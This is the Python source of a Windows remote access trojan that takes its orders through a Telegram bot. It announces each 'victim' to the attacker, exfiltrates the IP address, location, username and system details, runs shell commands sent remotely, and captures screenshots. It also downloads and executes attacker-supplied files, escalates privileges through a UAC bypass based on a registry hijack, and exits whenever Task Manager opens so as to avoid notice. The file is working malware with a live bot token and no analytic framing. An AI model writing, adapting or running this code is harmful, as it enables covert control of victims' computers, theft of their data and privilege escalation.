import requests
import json
import sys
import os
import getpass
from psutil import virtual_memory
from platform import uname , processor , machine
import subprocess
import pyautogui
import tempfile
from _winreg import *
from contextlib import suppress
import ctypes
import itertools
import psutil
import threading
class Loader():
	def __init__(self):
		self.token = "1867535261:AAG_wC07CxlM4ga5UfcA2eE_Jxxm9efPcG8"
		self.chat_id = "1742761281"
		data = json.loads(self.Request("http://ip-api.com/json/"))
		self.ip = data["query"]
		self.country = data["country"]
		self.privileges = "Administrator" if ctypes.windll.shell32.IsUserAnAdmin() == 1 else "User"
		thread = threading.Thread(target = self.Auto_Close)
		thread.start()
		self.SendNotification()
		self.Main()
	def Request(self,url):
		return requests.get(url).text.encode("utf-8")
	def Send_File(self,filename):
		url = "https://api.telegram.org/bot" + self.token + "/sendPhoto?caption=--" + getpass.getuser() + "--&chat_id=" + self.chat_id
		requests.get(url, files={'photo':open(filename,'rb')})
	def SendNotification(self):
		progrm = sys.argv[1]
		filename = "C:\\Users\\Public\\old.txt"
		if os.path.exists(filename):
			self.Request("https://api.telegram.org/bot" + self.token + "/sendMessage?text=😈 Online Victim : \n ❖ IP Address : " + self.ip + "\n ❖ Country : " + self.country + " \n ❖ Program Name : " + progrm + "\n ❖ Privileges : " + self.privileges + "\n--" + getpass.getuser() + "--&chat_id=" + self.chat_id)
		else:
			file = open("C:\\Users\\Public\\old.txt","w")
			self.Request("https://api.telegram.org/bot" + self.token + "/sendMessage?text=😈  New Victim : \n ❖ IP Address : " + self.ip + "\n ❖ Country : " + self.country + " \n ❖ Program Name : " + progrm + "\n ❖ Privileges : " + self.privileges + "\n--" + getpass.getuser() + "--&chat_id=" + self.chat_id)
	def Main(self):
		data = json.loads(self.Request('https://api.telegram.org/bot' + self.token + '/getUpdates'))
		old_date = data['result'][-1]['message']['date']
		while True:
			data = json.loads(self.Request('https://api.telegram.org/bot' + self.token + '/getUpdates'))
			message = data['result'][-1]['message']
			new_date = message['date']
			if(old_date != new_date):
				old_date = new_date
				if("text" in message.keys()):
					command = message['text'].split(" ")[0]
					if command == "/list":
						self.SendNotification()
					if command == "/geo" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
						data = json.loads(self.Request('http://ip-api.com/json/'))
						message = "🌎 Geo Location : \n"
						message += "❖ IP : " + data['query'] + "\n";
						message += "❖ Country : " + data['country'] + "\n";
						message += "❖ City : " + data['city'] + "\n";
						message += "❖ Region Name : " + data['regionName'] + "\n";
						message += "❖ Country Code : " + data['countryCode'] + "\n";
						message += "❖ Time Zone : " + data['timezone'] + "\n";
						message += "❖ MAP : http://extreme-ip-lookup.com/" + data['query'] + "\n";
						message += "--" + getpass.getuser() + "--"
						self.Request("https://api.telegram.org/bot" + self.token + "/sendMessage?text=" + message + "&chat_id=" + self.chat_id)
					elif command == "/close" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
						os.system("taskkill /IM python.exe /F")
					elif command == "/sys_info" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
						message = "🖥 System Info : \n"
						message += "❖ Username : " + getpass.getuser() + "\n"
						message += "❖ OS Version : Windows " + uname().release + "\n"
						message += "❖ RAM : " + str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB" + "\n"
						message += "❖ Bit : " + machine() + "\n"
						message += "❖ Processor : " + processor() + "\n"
						message += "--" + getpass.getuser() + "--"
						self.Request("https://api.telegram.org/bot" + self.token + "/sendMessage?text=" + message + "&chat_id=" + self.chat_id)
					elif command == "/restart" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
						filename = __file__.split("\\")
						filename.pop()
						filename = "\\".join(filename) + "\\Main.vbs"
						os.system("cmd.exe /c taskkill /F /IM python.exe & " + filename)
					elif command == "/execute" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
						spl = message['text'].split(" ")
						spl.remove(spl[0])
						spl.pop()
						cmd = " ".join(spl)
						runcmd = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
						output = runcmd.stdout.read() + runcmd.stderr.read()
						message = "🖥 Command [" + cmd + "] Output : \n"
						message += output + "\n"
						message += "--" + getpass.getuser() + "--"
						self.Request("https://api.telegram.org/bot" + self.token + "/sendMessage?text=" + message + "&chat_id=" + self.chat_id)
					elif command == "/screenshot" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
						file = tempfile.TemporaryFile()
						filename = file.name + ".jpg"
						file.close()
						pyautogui.screenshot().save(filename)
						self.Send_File(filename)
					elif command == "/browsers" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
						browsers = ""
						with suppress(WindowsError), OpenKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Clients\\StartMenuInternet\\", 0, KEY_READ|0) as k:
							for i in itertools.count():
								borwser = (EnumKey(k, i))
								if borwser.startswith("Firefox"):
									borwser = "Firefox"
								browsers += "❖ " + borwser + "\n"
						self.Request("https://api.telegram.org/bot" + self.token + "/sendMessage?text=🌐 Browsers List : \n" + browsers + "--" + getpass.getuser() + "--&chat_id=" + self.chat_id)
					elif command == "/bypass_uac" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
						REG_PATH = r'Software\Classes\ms-settings\shell\open\command'
						CreateKey(HKEY_CURRENT_USER, REG_PATH)
						registry_key = OpenKey(HKEY_CURRENT_USER, REG_PATH, 0, KEY_WRITE)
						SetValueEx(registry_key, "DelegateExecute", 0, REG_SZ, "")
						dirname = __file__.split("\\")
						dirname.pop()
						dirname = "wscript.exe \"" + "\\".join(dirname) + "\\Main.vbs\""
						SetValueEx(registry_key, None, 0, REG_SZ, dirname)
						CloseKey(registry_key)
						print("aa")
						os.system("ComputerDefaults.exe")
						exit();
				else:
					file_id = message['document']['file_id']
					caption = message['caption']
					if caption in [self.ip, getpass.getuser(), "All"]:
						data = json.loads(self.Request('https://api.telegram.org/bot' + self.token + '/getFile?file_id=' + file_id))
						link = data['result']['file_path']
						link = "https://api.telegram.org/file/bot" + self.token + "/" + link
						file = tempfile.TemporaryFile()
						filename = file.name + "." + link.split(".")[-1]
						file.close()
						req = requests.get(link)
						file = open(filename,"wb")
						file.write(req.content)
						file.close()
						subprocess.Popen(filename,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
						self.Request("https://api.telegram.org/bot" + self.token + "/sendMessage?text=✔️ File Downlaoded And Executed\n--" + getpass.getuser() + "--&chat_id=" + self.chat_id)
	def Auto_Close(self):
		while True:
			for proc in psutil.process_iter():
				try:
					if proc.name() == "Taskmgr.exe":
						os.system("taskkill /IM python.exe /F")
				except:
					pass

Loader()
